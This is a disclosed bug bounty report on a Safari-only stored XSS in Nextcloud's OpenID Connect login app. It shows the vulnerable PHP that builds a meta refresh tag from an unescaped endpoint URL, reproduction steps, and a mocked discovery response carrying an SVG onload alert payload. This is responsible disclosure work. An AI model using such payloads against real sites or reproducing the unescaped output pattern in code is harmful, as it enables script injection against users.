# [user_oidc] Stored XSS via Authorization Endpoint - Safari-Only

## Report Details
- **Report ID**: 1687410
- **URL**: https://hackerone.com/reports/1687410
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-08-31T13:13:12.592Z
- **Disclosed**: 2022-12-18T12:41:59.578Z

## Reporter
- **Username**: lauritz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
## Summary:
The [OpenID Connect User Backend](https://github.com/nextcloud/user_oidc/) allows users to login to Nextcloud using SSO.

A workaround that was apparently implemented for the *Safari*  browser enables stored Cross-Site-Scripting (XSS). The vulnerability only affects user agents that include "**Safari**" within their user agent string and is further limited by a restrictive Content-Security-Policy that is applied on the affected endpoint.

## Vulnerable Code
`/var/www/html/custom_apps/user_oidc/lib/Controller/LoginController.php`
```php
		// Workaround to avoid empty session on special conditions in Safari
		// https://github.com/nextcloud/user_oidc/pull/358
		if ($this->request->isUserAgent(['/Safari/']) && !$this->request->isUserAgent(['/Chrome/'])) {
			return new Http\DataDisplayResponse('<meta http-equiv="refresh" content="0; url=' . $url . '" />');
		}
```


## Exploit/Steps To Reproduce
0. Setup Nextcloud using the docker image:
```console
$ docker run -p 8081:80 nextcloud:latest
```
1. Enable `user_oidc` module via http://localhost:8081/settings/apps/integration/user_oidc
2. Configure plugin via http://localhost:8081/settings/admin/user_oidc - add a provider with arbitrary identifier, client_id and client_secret. Include the following URL as discovery endpoint: https://lhq.at/poc_jkhfdasgfdaskjlfadskhfdas.php.     
{F1894251}

The mocked discovery endpoint responds as follows:
```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
[...]

{
  "issuer":"http:\/\/idp.local:3000",
  "authorization_endpoint":"'\" http-equiv=><svg\/onload=alert(document.domain)>",
[...]
} 
```
3.  Launch a login flow using a Safari browser: http://localhost:8081/login.    
Nextcloud responds as follows without sufficiently encoding or filtering the `authorization_endpoint`:
```http
HTTP/1.1 200 OK
Date: Wed, 31 Aug 2022 12:47:57 GMT
Server: Apache/2.4.54 (Debian)
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Robots-Tag: none
X-XSS-Protection: 1; mode=block
X-Powered-By: PHP/8.0.21
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
X-Request-Id: yUWr3aQshJ5OHyMuzG1j
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
Content-Disposition: inline; filename=""
Vary: Accept-Encoding
Content-Length: 492
Connection: close
Content-Type: text/html; charset=UTF-8

<meta http-equiv="refresh" content="0; url='" http-equiv=><svg/onload=alert(document.domain)>?client_id=test.local&response_type=code&scope=openid+email+profile&redirect_uri=http%3A%2F%2Flocalhost%3A8081%2Fapps%2Fuser_oidc%2Fcode&claims=%7B%22id_token%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%2C%22userinfo%22%3A%7B%22email%22%3Anull%2C%22name%22%3Anull%2C%22quota%22%3Anull%7D%7D&state=FB8IZL2JE55LJ1Y5HJAINPY6OTDQ16P1&nonce=356M5O3J1PKMRKJNBKE40RUGJA06O40E" />
```

The execution of JavaScript is prevented by the `Content-Security-Policy` header:      
{F1894250}

## Impact

Stored XSS. The impact is limited due to the restrictive CSP that is applied on this endpoint.

## Attachments
- xss2.png
- xss1.png
